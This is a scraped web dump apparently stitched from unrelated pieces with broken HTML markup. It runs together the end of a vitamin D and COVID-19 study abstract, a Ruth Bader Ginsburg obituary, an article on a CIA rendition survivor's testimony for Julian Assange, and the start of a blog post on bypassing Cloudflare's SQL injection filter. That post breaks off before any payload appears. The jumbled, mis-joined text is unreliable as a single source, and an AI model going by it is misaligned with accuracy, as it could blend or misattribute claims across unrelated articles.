positivity was best fitted by the weighted second-order polynomial regression, which indicated strong correlation in the total population (R2 = 0.96) and in analyses stratified by all studied demographic factors. The association between lower SARS-CoV-2 positivity rates and higher circulating 25(OH)D levels remained significant in a multivariable logistic model adjusting for all included demographic factors (adjusted odds ratio 0.984 per ng/mL increment, 95% C.I. 0.983–0.986; p&lt;0.001). SARS-CoV-2 positivity is strongly and inversely associated with circulating 25(OH)D levels, a relationship that persists across latitudes, races/ethnicities, both sexes, and age ranges. Our findings provide impetus to explore the role of vitamin D supplementation in reducing the risk for SARS-CoV-2 infection and COVID-19 disease.</og:description>

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Justice Ruth Bader Ginsburg, the demure firebrand who in her 80s became a legal, cultural and feminist icon, died Friday. The Supreme Court announced her death, saying the cause was complications from metastatic cancer of the pancreas.&lt;/p&gt;
&lt;p&gt;The court, in a statement, said Ginsburg died at her home in Washington, D.C., surrounded by family. She was 87.&lt;/p&gt;
&lt;p&gt;&quot;Our nation has lost a justice of historic stature,&quot; Chief Justice John Roberts said. &quot;We at the Supreme Court have lost a cherished colleague. Today we mourn but with confidence that future generations will remember Ruth Bader Ginsburg as we knew her, a tireless and resolute champion of justice.&quot;&lt;/p&gt;
&lt;p&gt;Architect of the legal fight for women's rights in the 1970s, Ginsburg subsequently served 27 years on the nation's highest court, becoming its most prominent member. Her death will inevitably set in motion what promises to be a nasty and tumultuous political battle over who will succeed her, and it thrusts the Supreme Court vacancy into the spotlight of the presidential campaign.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Just days before her death, as her strength waned, Ginsburg dictated this statement to her granddaughter Clara Spera: &quot;My most fervent wish is that I will not be replaced until a new president is installed.&quot;&lt;/p&gt;
&lt;p&gt;She knew what was to come. Ginsburg's death will have profound consequences for the court and the country. Inside the court, not only is the leader of the liberal wing gone, but with the court about to open a new term, the chief justice no longer holds the controlling vote in closely contested cases.&lt;/p&gt;
&lt;p&gt;Though Roberts has a consistently conservative record in most cases, he has split from fellow conservatives in a few important ones this year, casting his vote with liberals, for instance, to protect at least temporarily the so-called DREAMers from deportation by the Trump administration, to uphold a major abortion precedent and to uphold bans on large church gatherings during the coronavirus pandemic. But with Ginsburg gone, there is no clear court majority for those outcomes.&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Upcoming political battle&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Indeed, a week after the upcoming presidential election, the court is for the third time scheduled to hear a challenge brought by Republicans to the Affordable Care Act, known as Obamacare. In 2012, the high court upheld the law in a 5-4 ruling, with Roberts casting the deciding vote and writing the opinion for the majority. But this time the outcome may well be different.&lt;/p&gt;
&lt;p&gt;That's because Ginsburg's death gives Republicans the chance to tighten their grip on the court with another appointment by President Trump so conservatives would have 6-3 majority. And that would mean that even a defection on the right would leave conservatives with enough votes to prevail in the Obamacare case and many others.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;At the center of the battle to achieve that will be Senate Majority Leader Mitch McConnell. In 2016, he took a step unprecedented in modern times: He refused for nearly a year to allow any consideration of President Barack Obama's Supreme Court nominee.&lt;/p&gt;
&lt;p&gt;Back then, McConnell's justification was the upcoming presidential election, which he said would allow voters a chance to weigh in on what kind of justice they wanted. But now, with the tables turned, McConnell has made clear he will not follow the same course. Instead he will try immediately to push through a Trump nominee so as to ensure a conservative justice to fill Ginsburg's liberal shoes, even if Trump were to lose his reelection bid. Asked what he would do in circumstances such as these, McConnell said: &quot;Oh, we'd fill it.&quot;&lt;/p&gt;
&lt;p&gt;So what happens in the coming weeks will be bare-knuckle politics, writ large, on the stage of a presidential election. It will be a fight Ginsburg had hoped to avoid, telling Justice John Paul Stevens shortly before his death that she hoped to serve as long as he did — until age 90.&lt;/p&gt;
&lt;p&gt;&quot;My dream is that I will stay on the court as long as he did,&quot; she said in an interview in 2019.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&quot;Tough as nails&quot;&lt;/strong&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;She didn't quite make it. But Ruth Bader Ginsburg was nonetheless a historic figure. She changed the way the world is for American women. For more than a decade, until her first judicial appointment in 1980, she led the fight in the courts for gender equality. When she began her legal crusade, women were treated, by law, differently from men. Hundreds of state and federal laws restricted what women could do, barring them from jobs, rights and even from jury service. By the time she donned judicial robes, however, Ginsburg had worked a revolution.&lt;/p&gt;
&lt;p&gt;That was never more evident than in 1996 when, as a relatively new Supreme Court justice, Ginsburg wrote the court's 7-1 opinion declaring that the Virginia Military Institute could no longer remain an all-male institution. True, Ginsburg said, most women — indeed most men — would not want to meet the rigorous demands of VMI. But the state, she said, could not exclude women who could meet those demands.&lt;/p&gt;
&lt;p&gt;&quot;Reliance on overbroad generalizations ... estimates about the way most men or most women are, will not suffice to deny opportunity to women whose talent and capacity place them outside the average description,&quot; Ginsburg wrote.&lt;/p&gt;
&lt;p&gt;She was an unlikely pioneer, a diminutive and shy woman, whose soft voice and large glasses hid an intellect and attitude that, as one colleague put it, was &quot;tough as nails.&quot;&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;By the time she was in her 80s, she had become something of a rock star to women of all ages. She was the subject of a hit documentary, a biopic, an operetta, merchandise galore featuring her &quot;Notorious RBG&quot; moniker, a &lt;em&gt;Time&lt;/em&gt; magazine cover and regular &lt;em&gt;Saturday Night Live&lt;/em&gt; sketches.&lt;/p&gt;
&lt;p&gt;On one occasion in 2016, Ginsburg got herself into trouble and &lt;a href=&quot;https://www.npr.org/2016/07/14/486080234/listen-justice-ginsburg-expands-on-decision-to-apologize-for-trump-remarks&quot;&gt;later publicly apologized&lt;/a&gt; for disparaging remarks she made about then-presidential candidate Trump.&lt;/p&gt;
&lt;p&gt;But for the most part Ginsburg enjoyed her fame and maintained a sense of humor about herself.&lt;/p&gt;
&lt;p&gt;Asked about the fact that she had apparently fallen asleep during the 2015 State of the Union address, Ginsburg did not take the Fifth, admitting that although she had vowed not to drink at dinner with the other justices before the speech, the wine had just been too good to resist. The result, she said, was that she was perhaps not an entirely &quot;sober judge&quot; and kept nodding off.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The road to law&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Born in Brooklyn, Ruth Bader went to public schools, where she excelled as a student — and as a baton twirler. By all accounts, it was her mother who was the driving force in her young life, but Celia Bader died of cancer the day before the future justice would graduate from high school.&lt;/p&gt;
&lt;p&gt;Then 17, Ruth Bader went on to Cornell University on a full scholarship, where she met Martin (aka &quot;Marty&quot;) Ginsburg. &quot;What made Marty so overwhelmingly attractive to me was that he cared that I had a brain,&quot; she said.&lt;/p&gt;
&lt;p&gt;After her graduation, they were married and went off to Fort Sill, Okla., for his military service. There Mrs. Ginsburg, despite scoring high on the civil service exam, could only get a job as a typist, and when she became pregnant, she lost even that job.&lt;/p&gt;
&lt;p&gt;Two years later, the couple returned to the East Coast to attend Harvard Law School. She was one of only nine women in a class of more than 500 and found the dean asking her why she was taking up a place that &quot;should go to a man.&quot;&lt;/p&gt;
&lt;p&gt;At Harvard, she was the academic star, not her husband. The couple were busy juggling schedules and their toddler when Marty Ginsburg was diagnosed with testicular cancer. Surgeries and aggressive radiation followed.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&quot;So that left Ruth with a 3-year-old child, a fairly sick husband, the law review, classes to attend and feeding me,&quot; Marty Ginsburg said in a 1993 interview with NPR.&lt;/p&gt;
&lt;p&gt;The experience also taught the future justice that sleep was a luxury. During the year of her husband's illness, he was only able to eat late at night; after that he would dictate his senior class paper to her. At about 2 a.m., he would go back to sleep, Ruth Bader Ginsburg recalled in an NPR interview. &quot;Then I'd take out the books and start reading what I needed to be prepared for classes the next day.&quot;&lt;/p&gt;
&lt;p&gt;Marty Ginsburg survived, graduated and got a job in New York; his wife, a year behind him in school, transferred to Columbia, where she graduated at the top of her law school class. Despite her academic achievements, the doors to law firms were closed to women, and though recommended for a Supreme Court clerkship, she wasn't even interviewed.&lt;/p&gt;
&lt;p&gt;It was bad enough that she was a woman, she recalled later, but she was also a mother, and male judges worried she would be diverted by her &quot;familial obligations.&quot;&lt;/p&gt;
&lt;p&gt;A mentor, law professor Gerald Gunther, finally got her a clerkship in New York by promising Judge Edmund Palmieri that if she couldn't do the work, he would provide someone who could. That was &quot;the carrot,&quot; Ginsburg would say later. &quot;The stick&quot; was that Gunther, who regularly fed his best students to Palmieri, told the judge that if he didn't take Ginsburg, Gunther would never send him a clerk again. The Ginsburg clerkship apparently was a success; Palmieri kept her not for the usual one year, but two, from 1959-61.&lt;/p&gt;
&lt;p&gt;Ginsburg's next path is rarely talked about, mainly because it doesn't fit the narrative. She learned Swedish so she could work with Anders Bruzelius, a Swedish civil procedure scholar. Through the Columbia University School of Law Project on International Procedure, Ginsburg and Bruzelius co-authored a book.&lt;/p&gt;
&lt;p&gt;In 1963, Ginsburg finally landed a teaching job at Rutgers Law School, where she at one point hid her second pregnancy by wearing her mother-in-law's clothes. The ruse worked; her contract was renewed before her baby was born.&lt;/p&gt;
&lt;p&gt;While at Rutgers, she began her work fighting gender discrimination.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The &quot;mother brief&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Her first big case was a challenge to a law that barred a Colorado man named Charles Moritz from taking a tax deduction for the care of his 89-year-old mother. The IRS said the deduction, by statute, could only be claimed by women, or widowed or divorced men. But Moritz had never married.&lt;/p&gt;
&lt;p&gt;The tax court concluded that the Internal Revenue Code was immune to constitutional challenge, a notion that tax lawyer Marty Ginsburg viewed as &quot;preposterous.&quot; The two Ginsburgs took on the case — he from the tax perspective, she from the constitutional one.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;According to Marty Ginsburg, for his wife, this was the &quot;mother brief.&quot; She had to think through all the issues and how to fix the inequity. The solution was to ask the court not to invalidate the statute but to apply it equally to both sexes. She won in the lower courts.&lt;/p&gt;
&lt;p&gt;&quot;Amazingly,&quot; he recalled in a 1993 NPR interview, the government petitioned the U.S. Supreme Court, stating that the decision &quot;cast a cloud of unconstitutionality&quot; over literally hundreds of federal statutes, and it attached a list of those statutes, which it compiled with Defense Department computers.&lt;/p&gt;
&lt;p&gt;Those laws, Marty Ginsburg added, &quot;were the statutes that my wife then litigated ... to overturn over the next decade.&quot;&lt;/p&gt;
&lt;p&gt;In 1971, she would write her first Supreme Court brief in the case of &lt;em&gt;Reed v. Reed.&lt;/em&gt; Ruth Bader Ginsburg represented Sally Reed, who thought she should be the executor of her son's estate instead of her ex-husband.&lt;/p&gt;
&lt;p&gt;The constitutional issue was whether a state could automatically prefer men over women as executors of estates. The answer from the all-male Supreme Court: no.&lt;/p&gt;
&lt;p&gt;It was the first time the court had struck down a state law because it discriminated based on gender.&lt;/p&gt;
&lt;p&gt;And that was just the beginning.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;By then Ginsburg was earning quite a reputation. She would become the first female tenured professor at Columbia Law School, and she would found the Women's Rights Project at the American Civil Liberties Union.&lt;/p&gt;
&lt;p&gt;As the chief architect of the battle for women's legal rights, Ginsburg devised a strategy that was characteristically cautious, precise and single-mindedly aimed at one goal: winning.&lt;/p&gt;
&lt;p&gt;Knowing that she had to persuade male, establishment-oriented judges, she often picked male plaintiffs, and she liked Social Security cases because they illustrated how discrimination against women can harm men. For example, in &lt;em&gt;Weinberger v. Wiesenfeld&lt;/em&gt;, she represented a man whose wife, the principal breadwinner, died in childbirth. The husband sought survivor's benefits to care for his child, but under the then-existing Social Security law, only widows, not widowers, were entitled to such benefits.&lt;/p&gt;
&lt;p&gt;&quot;This absolute exclusion, based on gender per se, operates to the disadvantage of female workers, their surviving spouses, and their children,&quot; Ginsburg told the justices at oral argument. The Supreme Court would ultimately agree, as it did in five of the six cases she argued.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Over the years, Ginsburg would file dozens of briefs seeking to persuade the courts that the 14th Amendment guarantee of equal protection applies not just to racial and ethnic minorities but to women as well.&lt;/p&gt;
&lt;p&gt;In an interview with NPR, she explained the legal theory that she eventually sold to the Supreme Court.&lt;/p&gt;
&lt;p&gt;&quot;The words of the 14th Amendment's equal protection clause — 'nor shall any state deny to any person the equal protection of the laws.' Well that word, 'any person,' covers women as well as men. And the Supreme Court woke up to that reality in 1971,&quot; Ginsburg said.&lt;/p&gt;
&lt;p&gt;During these pioneering years, Ginsburg would often work through the night as she had during law school. But by this time, she had two children, and she later liked to tell a story about the lesson she learned when her son, in grade school, seemed to have a proclivity for getting into trouble.&lt;/p&gt;
&lt;p&gt;The scrapes were hardly major, and Ginsburg grew exasperated by demands from school administrators that she come in to discuss her son's alleged misbehavior. Finally, there came a day when she had had enough. &quot;I had stayed up all night the night before, and I said to the principal, 'This child has two parents. Please alternate calls.' &quot;&lt;/p&gt;
&lt;p&gt;After that, she found, the calls were few and far between. It seemed, she said, that most infractions were not worth calling a busy husband about.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Supreme Court's second woman&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In 1980, President Jimmy Carter named Ginsburg to the U.S. Court of Appeals for the District of Columbia Circuit. Over the next 13 years, she would amass a record as something of a centrist liberal, and in 1993, President Bill Clinton nominated her to the Supreme Court, the second woman appointed to the position.&lt;/p&gt;
&lt;p&gt;She was not first on his list. For months, Clinton flirted with other potential nominees, and some women's rights activists withheld their active support because they were worried about Ginsburg's views on abortion. She had been publicly critical of the legal reasoning in &lt;em&gt;Roe v. Wade.&lt;/em&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;But in the background, Marty Ginsburg was lobbying hard for his wife. And finally Ruth Ginsburg was invited for a meeting with the president. As one White House official put it afterward, Clinton &quot;fell for her — hook, line and sinker.&quot; So did the Senate. She was confirmed by a 96-3 vote.&lt;/p&gt;
&lt;p&gt;Once on the court, Ginsburg was an example of a woman who defied stereotypes. Though she looked tiny and frail, she rode horses well into her 70s and even went parasailing. At home, it was her husband who was the chef, indeed a master chef, while the justice cheerfully acknowledged she was an awful cook.&lt;/p&gt;
&lt;p&gt;Though a liberal, she and the court's conservative icon, Antonin Scalia, who died in 2016, were the closest of friends. Indeed, &lt;a href=&quot;https://www.npr.org/2013/07/10/200137481/scalia-v-ginsburg-supreme-court-sparring-put-to-music&quot;&gt;an opera called&lt;/a&gt; &lt;em&gt;Scalia/Ginsburg&lt;/em&gt; is based on their legal disagreements, and their affection for each other.&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;Over the years, as Ginsburg's place on the court grew in seniority, so did her role. In 2006, as the court veered right after the retirement of Justice Sandra Day O'Connor, Ginsburg dissented more often and more assertively, her most passionate dissents coming in women's rights cases.&lt;/p&gt;
&lt;p&gt;Dissenting in &lt;em&gt;Ledbetter v. Goodyear&lt;/em&gt; in 2007, she called on Congress to pass legislation that would override a court decision that drastically limited back pay available for victims of employment discrimination. The resulting legislation was the first bill passed in 2009 after Obama took office.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In 2014, she dissented fiercely in &lt;em&gt;Burwell v. Hobby Lobby,&lt;/em&gt; a decision that allowed some for-profit companies to refuse, on religious grounds, to comply with a federal mandate to cover birth control in health care plans. Such an exemption, she said, would &quot;deny legions of women who do not hold their employers' beliefs, access to contraceptive coverage.&quot;&lt;/p&gt;
&lt;p&gt;Where, she asked, &quot;is the stopping point?&quot; Suppose it offends an employer's religious belief &quot;to pay the minimum wage&quot; or &quot;to accord women equal pay?&quot;&lt;/p&gt;
&lt;p&gt;And in 2013, when the court struck down a key provision of the Voting Rights Act, contending that times had changed and the law was no longer needed, Ginsburg dissented. She said that throwing out the provision &quot;when it has worked and is continuing to work ... is like throwing away your umbrella in a rainstorm because you are not getting wet.&quot;&lt;/p&gt;
&lt;p&gt;She viewed her dissents as a chance to persuade a future court.&lt;/p&gt;
&lt;p&gt;&quot;Some of my favorite opinions are dissenting opinions,&quot; Ginsburg told NPR. &quot;I will not live to see what becomes of them, but I remain hopeful.&quot;&lt;/p&gt;
&lt;p&gt;And yet, Ginsburg still managed some unexpected victories by winning over one or two of the conservative justices in important cases. In 2015, for example, she authored the court's decision upholding independent redistricting commissions established by voter referenda as a way of removing some of the partisanship in drawing legislative district lines.&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Ginsburg always kept a backbreaking schedule of public appearances both at home and abroad, even after five bouts with cancer: colon cancer in 1999, pancreatic cancer 10 years later, lung cancer in 2018, and then pancreatic cancer again in 2019 and liver lesions in 2020. During that time, she endured chemotherapy, radiation and, in the last years of her life, terrible pain from shingles that never went away completely. All who knew her admired her grit. In 2009, three weeks after major cancer surgery, she surprised everyone when she showed up for the State of the Union address.&lt;/p&gt;
&lt;p&gt;Shortly after that, she was back on the bench; it was her husband, Marty, who told her she could do it, even when she thought she could not, she told NPR.&lt;/p&gt;
&lt;p&gt;A year later her psychological toughness was on full display when her beloved husband of 56 years was mortally ill. As she packed up his things at the hospital before taking him home to die, she found a note he had written to her. &quot;My Dearest Ruth,&quot; it began, &quot;You are the only person I have ever loved,&quot; setting aside children and family. &quot;I have admired and loved you almost since the day we first met at Cornell. ... The time has come for me to ... take leave of life because the loss of quality simply overwhelms. I hope you will support where I come out, but I understand you may not. I will not love you a jot less.&quot;&lt;/p&gt;
&lt;p&gt;Shortly after that, Marty Ginsburg died at home. The next day, his wife, the justice, was on the bench, reading an important opinion she had authored for the court. She was there, she said, because &quot;Marty would have wanted it.&quot;&lt;/p&gt;
&lt;p&gt;Years later, she would read the letter aloud in an NPR interview, and at the end, choke down the tears.&lt;/p&gt;
&lt;p&gt;In the years after Marty's death, she would persevere without him, maintaining a jam-packed schedule when she was not on the bench or working on opinions.&lt;/p&gt;
&lt;p&gt;Some liberals criticized her for not retiring while Obama was president, but she was at the top of her game, enjoyed her work enormously and feared that Republicans might not confirm a successor. She was an avid consumer of opera, literature and modern art. But in the end, it was her work, she said, that sustained her.&lt;/p&gt;
&lt;p&gt;&quot;I do think that I was born under a very bright star,&quot; she said in an NPR interview. &quot;Because if you think about my life, I get out of law school. I have top grades. No law firm in the city of New York will hire me. I end up teaching; it gave me time to devote to the movement for evening out the rights of women and men.&quot;&lt;/p&gt;
&lt;p&gt;And it was that legal crusade for women's rights that ultimately led to her appointment to the U.S. Supreme Court.&lt;/p&gt;
&lt;p&gt;To the end of her tenure, she remained a special kind of feminist, both decorous and dogged.&lt;/p&gt;

<title>Survivor of CIA Torture and Rendition Supports Assange at Extradition Trial</title>

&lt;p&gt;Khaled El Masri, a survivor of CIA kidnapping, torture, rendition, and detention, submitted testimony in support of WikiLeaks founder Julian Assange during his extradition trial.&lt;/p&gt;
&lt;p&gt;The Central Criminal Court in London was prepared for El Masri to testify. An interpreter was lined up for the ninth day of proceedings. However, technical problems prevented him from addressing the court beyond his written statement.&lt;/p&gt;&lt;p&gt;Prosecutors also objected to El Masri giving live testimony. According to Court News UK reporter &lt;a href=&quot;https://twitter.com/CharlieDanJones/status/1306920403554783236?s=20&quot;&gt;Charlie Jones&lt;/a&gt;, that prompted Assange to stand up and proclaim, &quot;I will not accept you censoring a torture victim's statement to this court.&quot;&lt;/p&gt;
&lt;p&gt;El Masri’s testimony directly relates to the defense argument that Assange published classified information from the United States in order to reveal abuses and misconduct, such as torture and war crimes.&lt;/p&gt;
&lt;p&gt;In the United Kingdom, Assange’s legal team has been allowed to enter this evidence into the public record. However, during a potential trial in the United States, it will likely be excluded as irrelevant because the Espionage Act does not allow a public interest defense.&lt;/p&gt;
&lt;p&gt;Assange is accused of 17 counts of violating the Espionage Act and one count of conspiracy to commit a computer crime that, as alleged in the indictment, is written like an Espionage Act offense.&lt;/p&gt;
&lt;p&gt;The charges criminalize the act of merely receiving classified information, as well as the publication of state secrets from the United States government. It targets common practices in newsgathering, which is why the case is widely opposed by press freedom organizations throughout the world.&lt;/p&gt;
&lt;p&gt;El Masri declared, “I record here my belief that without dedicated and brave exposure of the state secrets in question what happened to me would never have been acknowledged and understood.” He added threats and intimidation are “not diminishing but expanding for all concerned.”&lt;/p&gt;
&lt;p&gt;“I nevertheless believe that the exposure of what happened was necessary not just for myself but for law and justice worldwide. My story is not yet concluded.”&lt;/p&gt;
&lt;p&gt;As El Masri noted, he submited testimony because “WikiLeaks publications were relied on by the [European Court of Human Rights] in obtaining the redress” he received.&lt;/p&gt;
&lt;p&gt;While reading parts of El Masri’s statement for the court, defense attorney Mark Summers said that, as a result of cables, it is known that the German government bowed to pressure from the U.S. to not seek the extradition of the CIA rendition team.&lt;/p&gt;
&lt;p&gt;El Masri also mentioned the WikiLeaks cables similarly showed that the U.S. government interfered in a judicial investigation in Germany and in Spain. (The rendition flight in question traveled from Palma airport in Spain.)&lt;/p&gt;
&lt;p&gt;Media scrutiny led to a parliamentary investigation, but that did not prevent El Masri from facing what he described as “impediments” to ascertaining the truth, “including via witnesses whose details” he learned about while in prison in Afghanistan.&lt;/p&gt;
&lt;p&gt;El Masri recalled incidents since his rendition and torture that have caused him fear, such as “being suddenly blocked on the motorway by cars, unknown strangers approaching my children,” and his complaints to police leading them trying to have him committed to a “hospital for the mentally ill.”&lt;/p&gt;
&lt;p&gt;“I and my family endured extended and repeated hostile experiences over many years,” El Masri shared. “These have been fully documented, and I therefore do not go into them in detail in this statement.”&lt;/p&gt;
&lt;p&gt;He mentioned the CIA told him he would be spied upon following his release, a fact an Inspector General report confirmed:&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;…The following evening, these officers met again with el Masri and related conditions for his release which included…that he would not reveal his experiences to the media or local authority; that he would accept that his post release activities would be monitored and that any breach of his pledge would have consequences.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;The CIA Torture and Rendition of El Masri&lt;/h2&gt;
&lt;p&gt;By submitting testimony in Assange’s extradition trial, El Masri took a great risk. It is already known that the CIA supported UC Global, a Spanish private security company, in an espionage operation that targeted Assange while he was living under political asylum in the Ecuador Embassy in London.&lt;/p&gt;
&lt;p&gt;El Masri has also been denied any semblance of justice by the U.S. government for what was done to him.&lt;/p&gt;
&lt;p&gt;Therefore, while the details of what happened to El Masri are well-known, I’ll recount what was summarized in his statement. &lt;/p&gt;
&lt;p&gt;At the Macedonian border, El Masri was kidnapped, detained, and held incommunicado and abused for 23 days. On January 23, 2004, a CIA rendition team handcuffed and blindfolded him at Skopje Airport.&lt;/p&gt;
&lt;p&gt;A CIA rendition team “physically overwhelmed” El Masri and cut off all his clothes except his blindfold.&lt;/p&gt;
&lt;p&gt;The European Court of Human Rights (ECHR) confirmed nine years after that El Masri was “severely beaten, sodomized, shackled, and hooded, and subjected total sensory deprivation—carried out in the presence of state officials of Macedonia and within its jurisdiction.”&lt;/p&gt;
&lt;p&gt;Macedonia’s “government was consequently responsible for those acts performed by foreign officials…Those measures had been used with premeditation, the aim being to cause Mr. Masri severe pain and suffering in order to obtain information,” the ECHR additionally found.&lt;/p&gt;
&lt;p&gt;When his blindfold was removed, El Masri recalled flash photography “temporarily blinded” him. He then saw seven or eight men wearing black and black masks. They put him in a diaper and tracksuit with a bag over his head and earmuffs. He was shackled and marched to aircraft.&lt;/p&gt;
&lt;p&gt;“On the plane, I was spread-eagled and my limbs tied to the sides of the aircraft. I was given injections and an anesthetic. I was unconscious for most of the journey,” according to El Masri.&lt;/p&gt;
&lt;p&gt;El Masri later learned he was in Afghanistan. He was held incommunicado in a “cold concrete cell” in winter. “Humiliated, stripped naked, insulted, and threatened.” He was interrogated, and in March 2004, he initiated a hunger strike.&lt;/p&gt;
&lt;p&gt;On the 34th day of the hunger strike, El Masri said he was dragged from the cell to an interrogation room, “tied to a chair, and a tube [was] painfully forced through [his] nose.”&lt;/p&gt;
&lt;p&gt;El Masri discovered later that the CIA knew his detention was a result of “mistaken identity.” They understood he should be released but kept him detained for several more months.&lt;/p&gt;
&lt;p&gt;By May 2004, El Masri learned he would be released. He was interrogated once more and “warned as a condition” of his release that he was “never to mention what happened” or there would be consequences.&lt;/p&gt;
&lt;p&gt;El Masri was blindfolded and shackled — again—on May 28. He was led out of his cell, handed the suitcase he arrived with in Skopje, and told to change back into the clothes he had in Macedonia.&lt;/p&gt;
&lt;p&gt;Then, El Masri was brought to an aircraft and subject to what can only be described as a reverse rendition. He was blindfolded, earmuffed, and chained to a seat. He was informed he would eventually land in a European country and then be allowed to return to Germany.&lt;/p&gt;
&lt;p&gt;The plane landed in Albania. He believed when he landed he would be shot in the back. They asked him why he was in Albania with no permission because he had a German passport. He said he didn’t know where he was.&lt;/p&gt;
&lt;h2&gt;Without WikiLeaks, The Truth Of What Happened To El Masri Would Still Be Buried&lt;/h2&gt;
&lt;p&gt;On September 16, John Goetz, a German journalist who worked for Der Spiegel from 2010-2011, provided a statement to the court to help reinforce El Masri’s testimony.&lt;/p&gt;
&lt;p&gt;“The investigation into what happened to him was as difficult as anything I have worked on,” Goetz declared. “It was only years later, when WikiLeaks published U.S. diplomatic cables in 2010-2011, that I finally found an explanation about why there were so many difficulties during the investigation. It revealed not only that significant information had been suppressed, but I finally understood why there were no repercussions when that information was revealed.”&lt;/p&gt;
&lt;p&gt;“The U.S. diplomatic cables revealed the extent of pressure brought upon the German authorities (and in parallel, relevant Spanish authorities) not to act upon the clear evidence of criminal acts by the USA even though by then exposed,” Goetz added.&lt;/p&gt;
&lt;p&gt;“As is clear from his statement,” Goetz stated, El Masri’s “ordeal did not end in 2004 after he found himself again in Germany. I have maintained contact with Mr. El Masri since the time of my investigation and confirm, in addition to the accuracy of his account of his rendition and torture in 2004 that what he describes of his frustrated quest for acknowledgment by those in a position to do so can also be corroborated.”&lt;/p&gt;
&lt;p&gt;“Every impediment has been and continues to be placed in the appropriate resolution and conclusion of his case including acceptance and responsibility by the primary perpetrator of the atrocities against him, the USA.”&lt;/p&gt;
&lt;p&gt;“The impediments have taken a further and disturbing course to this day, with threats and intimidatory measures being announced by the relevant minister, U.S. Secretary of State Pompeo, threatening retribution upon those party to bringing cases (of which Mr El-Masri’s case is currently one) to the International Criminal Court,” Goetz contended.&lt;/p&gt;
&lt;p&gt;Goetz wrote, “The intimidation surrounding this case, frequently intruding in the past as he described, at times covert, is now manifestly overt.”&lt;/p&gt;
&lt;p&gt;“I note that the denial of the ‘right to truth’ referred to by the European Court in relation to Mr. El Masri has had severe and enduring effects upon Mr. El Masri and his family. It remains difficult even for those closely reporting on the history of the last 15 years for Mr. El Masri to fully explain the extent of his continuing trauma and the need for it to be addressed and recognized by those responsible—to ‘acknowledge the truth,'” Goetz maintained.&lt;/p&gt;
&lt;p&gt;Goetz, who traveled to North Carolina to confront members of the CIA team behind El Masri’s rendition, further declared, “Without publication of information that the U.S. government intended to be kept secret for national security reasons, the entire truth would still be buried. Because it was only when reading the diplomatic cables that we saw the role the U.S government was playing behind the scene.&lt;/p&gt;
&lt;p&gt;The publication of the cables “threw light on the pressures and bullying techniques brought by the U.S. in more than one country to prevent the prosecution of CIA agents involved [in the El Masri case].”&lt;/p&gt;
&lt;p&gt;Goetz concluded, “These detailed revelations threw light on otherwise inexplicable actions by the countries involved. Together with other information [related to] the Afghan/Iraq Wars and Guantanamo Bay, and in relation to other renditions and rendition flights, the full picture could finally be seen and understood.”&lt;/p&gt;&lt;p&gt;*&lt;em&gt;Screen shot from &quot;Outlawed,&quot; a documentary produced in 2006 with support from ACLU, Amnesty International, Center for Constitutional Rights, and other groups&lt;/em&gt;&lt;/p&gt;

<title>How I bypassed Cloudflare&amp;#039;s SQL Injection filter</title>
<link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
<guid isPermaLink="true" >https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</guid>
<description>&lt;p&gt;In late 2018 I was tasked with performing a Web Application security assessment for a large client. After running the standard scans with automated tools, something interesting came up: a possible SQL injection which couldn’t be exploited using the tool. The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.&lt;/p&gt;&lt;h4 id=&quot;details-about-the-application&quot;&gt;Details about the application&lt;/h4&gt;
&lt;p&gt;The application was a generic website written in PHP with MySQL as the backend DBMS. The vulnerable page submitted a POST request with multipart form body data to the /index.php endpoint. I honestly don’t remember the use of the form and it doesn’t really matter for the writeup. The POST request looked like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/index.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;******&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;The unsanitized parameter at X-MARK can be used to inject arbitrary values at the place of the WHERE clause of an SQL SELECT query. For example, if the above data was sent as the body of the POST request, the SQL query which would be executed on the server would look something like this:&lt;/p&gt;
&lt;pre&gt;
